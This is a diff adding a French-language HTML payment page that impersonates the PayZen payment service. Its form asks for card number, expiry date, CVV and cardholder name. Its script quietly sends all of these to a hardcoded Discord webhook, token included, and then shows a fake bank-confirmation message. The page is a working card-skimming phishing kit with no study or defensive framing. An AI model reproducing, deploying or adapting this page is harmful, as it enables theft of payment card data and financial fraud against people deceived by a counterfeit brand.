@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire de Paiement</title>
+    <style>
+body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .header {
+            background-color: #000; /* Couleur de fond noire */
+            padding: 50px 0; /* Ajustez la marge intérieure en haut/bas selon vos besoins */
+            text-align: center;
+            width: 100%;
+        }
+
+        .header img.logo {
+            max-width: 150px; /* Ajustez la taille du logo selon vos besoins */
+        }
+
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+
+        .payment-container {
+            max-width: 1200px; /* Augmentation de la largeur du formulaire */
+            margin: 20px auto;
+            padding: 40px;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            border-radius: 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+/* Styles CSS pour les champs de formulaire */
+        label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        input[type="text"],
+        input[type="number"],
+        select {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 10px; /* Cases arrondies */
+            box-sizing: border-box; /* Empêche les débordements */
+        }
+
+        button[type="submit"] {
+            background-color: #007bff;
+            color: #fff;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 10px; /* Cases arrondies */
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button[type="submit"]:hover {
+            background-color: #0056b3;
+        }
+
+        /* Style pour la case à cocher */
+        .checkbox-label {
+            display: flex;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        .checkbox-label input[type="checkbox"] {
+            margin-right: 10px;
+        }
+
+        /* Style pour le logo PayZen */
+        .logo-payzen {
+            max-width: 200px; /* Ajustez la taille du logo selon vos besoins */
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img class="logo" src="https://www.payzen.eu/wp-content/uploads/2021/12/Logo-PZ-byLyra-blu_300dpi-300x126-1.webp" alt="Logo">
+    </div>
+    <div class="payment-container">
+        <img class="logo-payzen" src="https://nature-et-developpement.com/wp-content/uploads/Pay-Zen-100-securise_logo_2022.jpg" alt="Logo PayZen">
+        <form action="/process_payment" method="POST" id="paymentForm">
+            <label for="cardNumber">Numéro de carte :</label>
+            <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required>
+
+            <label for="expiryDate">Date d'expiration :</label>
+            <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>
+
+            <label for="cvv">CVV :</label>
+            <input type="number" id="cvv" name="cvv" placeholder="123" required>
+
+            <label for="name">Nom sur la carte :</label>
+            <input type="text" id="name" name="name" placeholder="John Doe" required>
+
+            <label for="amount">Montant à payer :</label>
+            <select id="amount" name="amount">
+                <option value="1">1 EUR</option>
+                <option value="10">10 EUR</option>
+                <option value="50">50 EUR</option>
+                <option value="100">100 EUR</option>
+                <option value="200">200 EUR</option>
+                <option value="500">500 EUR</option>
+            </select>
+
+            <div class="checkbox-label">
+                <input type="checkbox" id="acceptTerms" name="acceptTerms" required>
+                <label for="acceptTerms">J'accepte les conditions d'utilisation et la collecte de mes données.</label>
+            </div>
+
+            <button type="submit" id="pay-button">Payer</button>
+        </form>
+    </div>
+    <!-- Ajoutez le script ici -->
+    <script>
+                document.getElementById("paymentForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            // Récupérer les valeurs du formulaire
+            const nom = document.getElementById("name").value;
+            const numeroCarte = document.getElementById("cardNumber").value;
+            const dateExp = document.getElementById("expiryDate").value;
+            const cvv = document.getElementById("cvv").value;
+            const montant = document.getElementById("amount").value;
+
+            // Créer un objet de données à envoyer au webhook Discord
+            const data = {
+                content: `Nom: ${nom}, Numéro de carte: ${numeroCarte}, Date d'expiration: ${dateExp}, CVV: ${cvv}, Montant: ${montant}`
+            };
+
+            // Envoyer les données au webhook Discord
+            fetch('https://discord.com/api/webhooks/1155180892403286027/vpvH6emyiypAuGWdApkBNytMUmbf9HTZjJCzmwJT5xB252COAUD6NtLoXEaS73REN1iI', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Nous allons vous envoyer une comfirmation bancaire.");
+                } else {
+                    alert("Erreur lors du paiement !");
+                 }
+            })
+            .catch(error => {
+                console.error("Une erreur s'est produite:", error);
+            });
+        });
+    </script>
+</body>
+</html>
